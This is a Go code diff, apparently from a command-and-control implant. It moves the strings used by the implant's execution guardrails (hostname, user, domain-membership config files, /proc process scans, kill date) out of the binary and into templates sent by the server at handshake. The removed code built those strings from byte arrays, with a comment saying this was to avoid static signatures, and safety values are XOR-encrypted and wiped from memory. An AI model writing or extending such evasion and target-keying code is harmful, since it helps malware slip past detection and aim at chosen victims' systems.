@@ -66,40 +66,65 @@ func clearString(s *string) {
 	*s = ""
 }
 
-// Exec requirements strings (constructed to avoid static signatures)
-var (
-	// File paths
-	erPathEtcHostname = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x68, 0x6f, 0x73, 0x74, 0x6e, 0x61, 0x6d, 0x65})                                                                         // /etc/hostname
-	erPathSssdConf    = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x73, 0x73, 0x64, 0x2f, 0x73, 0x73, 0x73, 0x64, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                                     // /etc/sssd/sssd.conf
-	erPathSmbConf     = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x61, 0x6d, 0x62, 0x61, 0x2f, 0x73, 0x6d, 0x62, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                                     // /etc/samba/smb.conf
-	erPathKrb5Conf    = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x6b, 0x72, 0x62, 0x35, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                                                                   // /etc/krb5.conf
-	erPathIpaConf     = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x69, 0x70, 0x61, 0x2f, 0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                         // /etc/ipa/default.conf
-	erPathProc        = string([]byte{0x2f, 0x70, 0x72, 0x6f, 0x63})                                                                                                                         // /proc
-	erPathTildeFwd    = string([]byte{0x7e, 0x2f})                                                                                                                                           // ~/
+// ExecReqTemplate stores exec requirements template strings received from server
+type ExecReqTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+	Params    []string `json:"p"`
+}
 
-	// Environment variable names
-	erEnvUser    = string([]byte{0x55, 0x53, 0x45, 0x52})                                           // USER
-	erEnvLogname = string([]byte{0x4c, 0x4f, 0x47, 0x4e, 0x41, 0x4d, 0x45})                         // LOGNAME
+// Exec requirements template indices - must match server's common.go
+const (
+	idxExecReqPathEtcHostname   = 300
+	idxExecReqPathSssdConf      = 301
+	idxExecReqPathSmbConf       = 302
+	idxExecReqPathKrb5Conf      = 303
+	idxExecReqPathIpaConf       = 304
+	idxExecReqPathProc          = 305
+	idxExecReqPathTildeFwd      = 306
+	idxExecReqEnvUser           = 307
+	idxExecReqEnvLogname        = 308
+	idxExecReqPatternDomainsEq  = 309
+	idxExecReqPatternDomainsEq2 = 310
+	idxExecReqPatternWorkgroup  = 311
+	idxExecReqPatternRealm      = 312
+	idxExecReqPatternDefRealm   = 313
+	idxExecReqPatternDomainEq   = 314
+	idxExecReqPatternDomainEq2  = 315
+	idxExecReqProcCmdline       = 316
+	idxExecReqProcComm          = 317
+	idxExecReqWordTrue          = 318
+	idxExecReqTimeFmtFull       = 319
+	idxExecReqEnvHostname       = 320
+	idxExecReqEnvShell          = 321
 
-	// Config file patterns
-	erPatternDomainsEq  = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x73, 0x20, 0x3d})       // domains =
-	erPatternDomainsEq2 = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x73, 0x3d})             // domains=
-	erPatternWorkgroup  = string([]byte{0x77, 0x6f, 0x72, 0x6b, 0x67, 0x72, 0x6f, 0x75, 0x70})       // workgroup
-	erPatternRealm      = string([]byte{0x72, 0x65, 0x61, 0x6c, 0x6d})                               // realm
-	erPatternDefRealm   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x5f, 0x72, 0x65, 0x61, 0x6c, 0x6d}) // default_realm
-	erPatternDomainEq   = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x20, 0x3d})             // domain =
-	erPatternDomainEq2  = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x3d})                   // domain=
-
-	// Proc file names
-	erProcCmdline = string([]byte{0x63, 0x6d, 0x64, 0x6c, 0x69, 0x6e, 0x65})                         // cmdline
-	erProcComm    = string([]byte{0x63, 0x6f, 0x6d, 0x6d})                                           // comm
-
-	// String literals
-	erWordTrue = string([]byte{0x74, 0x72, 0x75, 0x65})                                              // true
-
-	// Time format strings
-	erTimeFmtFull = string([]byte{0x32, 0x30, 0x30, 0x36, 0x2d, 0x30, 0x31, 0x2d, 0x30, 0x32, 0x20, 0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35}) // 2006-01-02 15:04:05
+	// System info strings (for getSystemInfo.go)
+	idxExecReqSysInfoStartupTime  = 322
+	idxExecReqSysInfoStatusActive = 323
 )
+
+// Global exec req template storage (uses SecureTemplate for memory zeroing)
+var globalExecReqTpl *SecureTemplate
+
+// setExecReqTemplate stores the exec requirements template (converts to SecureTemplate)
+func setExecReqTemplate(tpl *ExecReqTemplate) {
+	// Zero old template before replacing
+	if globalExecReqTpl != nil {
+		globalExecReqTpl.Zero()
+	}
+	globalExecReqTpl = NewSecureTemplateFromSlices(tpl.Version, tpl.Type, tpl.Templates, tpl.Params)
+}
+
+// erTpl safely retrieves a template string by index
+func erTpl(idx int) string {
+	return globalExecReqTpl.Get(idx)
+}
+
+// getErStr gets exec req string from template (no fallbacks - templates sent during handshake)
+func getErStr(idx int) string {
+	return erTpl(idx)
+}
 
 // PerformSafetyChecks runs all configured safety checks
 // Safety values are XOR encrypted - decrypt, compare, then clear from memory
@@ -138,7 +163,7 @@ func PerformSafetyChecks() bool {
 	if safetyFilePath != "" {
 		path := decryptSafetyValue(safetyFilePath)
 		mustExistVal := decryptSafetyValue(safetyFileMustExist)
-		mustExist := mustExistVal == erWordTrue
+		mustExist := mustExistVal == getErStr(idxExecReqWordTrue)
 		result := checkFile(path, mustExist)
 		clearString(&path)
 		clearString(&mustExistVal)
@@ -199,7 +224,7 @@ func checkHostname(expected string) bool {
 
 	// Also check /etc/hostname as a fallback
 	if !strings.EqualFold(hostname, expected) {
-		if data, err := os.ReadFile(erPathEtcHostname); err == nil {
+		if data, err := os.ReadFile(getErStr(idxExecReqPathEtcHostname)); err == nil {
 			hostname = strings.TrimSpace(string(data))
 		}
 	}
@@ -213,9 +238,9 @@ func checkUsername(expected string) bool {
 	currentUser, err := user.Current()
 	if err != nil {
 		// Fallback to environment variable
-		username := os.Getenv(erEnvUser)
+		username := os.Getenv(getErStr(idxExecReqEnvUser))
 		if username == "" {
-			username = os.Getenv(erEnvLogname)
+			username = os.Getenv(getErStr(idxExecReqEnvLogname))
 		}
 		return strings.EqualFold(username, expected)
 	}
@@ -259,7 +284,7 @@ func checkDomain(expected string) bool {
 
 // checkSSSDDomain checks SSSD configuration for domain membership
 func checkSSSDDomain() string {
-	file, err := os.Open(erPathSssdConf)
+	file, err := os.Open(getErStr(idxExecReqPathSssdConf))
 	if err != nil {
 		return ""
 	}
@@ -268,7 +293,7 @@ func checkSSSDDomain() string {
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
-		if strings.HasPrefix(line, erPatternDomainsEq) || strings.HasPrefix(line, erPatternDomainsEq2) {
+		if strings.HasPrefix(line, getErStr(idxExecReqPatternDomainsEq)) || strings.HasPrefix(line, getErStr(idxExecReqPatternDomainsEq2)) {
 			parts := strings.Split(line, "=")
 			if len(parts) > 1 {
 				domain := strings.TrimSpace(parts[1])
@@ -287,7 +312,7 @@ func checkSSSDDomain() string {
 
 // checkSambaDomain checks Samba configuration for domain membership
 func checkSambaDomain() string {
-	file, err := os.Open(erPathSmbConf)
+	file, err := os.Open(getErStr(idxExecReqPathSmbConf))
 	if err != nil {
 		return ""
 	}
@@ -299,7 +324,7 @@ func checkSambaDomain() string {
 		lineLower := strings.ToLower(line)
 
 		// Look for "workgroup = DOMAIN" or "realm = domain.com"
-		if strings.HasPrefix(lineLower, erPatternWorkgroup) || strings.HasPrefix(lineLower, erPatternRealm) {
+		if strings.HasPrefix(lineLower, getErStr(idxExecReqPatternWorkgroup)) || strings.HasPrefix(lineLower, getErStr(idxExecReqPatternRealm)) {
 			if strings.Contains(line, "=") {
 				parts := strings.Split(line, "=")
 				if len(parts) > 1 {
@@ -314,7 +339,7 @@ func checkSambaDomain() string {
 
 // checkKerberosRealm checks for Kerberos configuration
 func checkKerberosRealm() string {
-	file, err := os.Open(erPathKrb5Conf)
+	file, err := os.Open(getErStr(idxExecReqPathKrb5Conf))
 	if err != nil {
 		return ""
 	}
@@ -323,7 +348,7 @@ func checkKerberosRealm() string {
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
-		if strings.HasPrefix(strings.ToLower(line), erPatternDefRealm) {
+		if strings.HasPrefix(strings.ToLower(line), getErStr(idxExecReqPatternDefRealm)) {
 			if strings.Contains(line, "=") {
 				parts := strings.Split(line, "=")
 				if len(parts) > 1 {
@@ -339,7 +364,7 @@ func checkKerberosRealm() string {
 // checkFreeIPADomain checks for FreeIPA/IdM domain membership
 func checkFreeIPADomain() string {
 	// Check /etc/ipa/default.conf
-	file, err := os.Open(erPathIpaConf)
+	file, err := os.Open(getErStr(idxExecReqPathIpaConf))
 	if err != nil {
 		return ""
 	}
@@ -348,7 +373,7 @@ func checkFreeIPADomain() string {
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
-		if strings.HasPrefix(line, erPatternDomainEq) || strings.HasPrefix(line, erPatternDomainEq2) {
+		if strings.HasPrefix(line, getErStr(idxExecReqPatternDomainEq)) || strings.HasPrefix(line, getErStr(idxExecReqPatternDomainEq2)) {
 			parts := strings.Split(line, "=")
 			if len(parts) > 1 {
 				return strings.TrimSpace(parts[1])
@@ -362,7 +387,7 @@ func checkFreeIPADomain() string {
 // checkFile verifies file existence based on the requirement
 func checkFile(path string, mustExist bool) bool {
 	// Expand ~ to home directory if present
-	if strings.HasPrefix(path, erPathTildeFwd) {
+	if strings.HasPrefix(path, getErStr(idxExecReqPathTildeFwd)) {
 		if home, err := os.UserHomeDir(); err == nil {
 			path = filepath.Join(home, path[2:])
 		}
@@ -392,7 +417,7 @@ func checkProcess(processName string) bool {
 
 // checkProcessViaProc checks for process via /proc filesystem
 func checkProcessViaProc(processName string) bool {
-	entries, err := os.ReadDir(erPathProc)
+	entries, err := os.ReadDir(getErStr(idxExecReqPathProc))
 	if err != nil {
 		return false
 	}
@@ -418,7 +443,7 @@ func checkProcessViaProc(processName string) bool {
 		}
 
 		// Read the cmdline file to get process name
-		cmdlinePath := filepath.Join(erPathProc, pid, erProcCmdline)
+		cmdlinePath := filepath.Join(getErStr(idxExecReqPathProc), pid, getErStr(idxExecReqProcCmdline))
 		cmdlineBytes, err := os.ReadFile(cmdlinePath)
 		if err != nil {
 			continue
@@ -434,7 +459,7 @@ func checkProcessViaProc(processName string) bool {
 		}
 
 		// Also check comm file for just the process name
-		commPath := filepath.Join(erPathProc, pid, erProcComm)
+		commPath := filepath.Join(getErStr(idxExecReqPathProc), pid, getErStr(idxExecReqProcComm))
 		commBytes, err := os.ReadFile(commPath)
 		if err != nil {
 			continue
@@ -480,7 +505,7 @@ func checkProcessGopsutil(processName string) bool {
 // checkKillDate verifies the current date is before the kill date
 func checkKillDate(killDateStr string) bool {
 	// Parse kill date (format: "2006-01-02 15:04:05")
-	killDate, err := time.Parse(erTimeFmtFull, killDateStr)
+	killDate, err := time.Parse(getErStr(idxExecReqTimeFmtFull), killDateStr)
 	if err != nil {
 		// If we can't parse the kill date, fail safe and don't run
 		return false
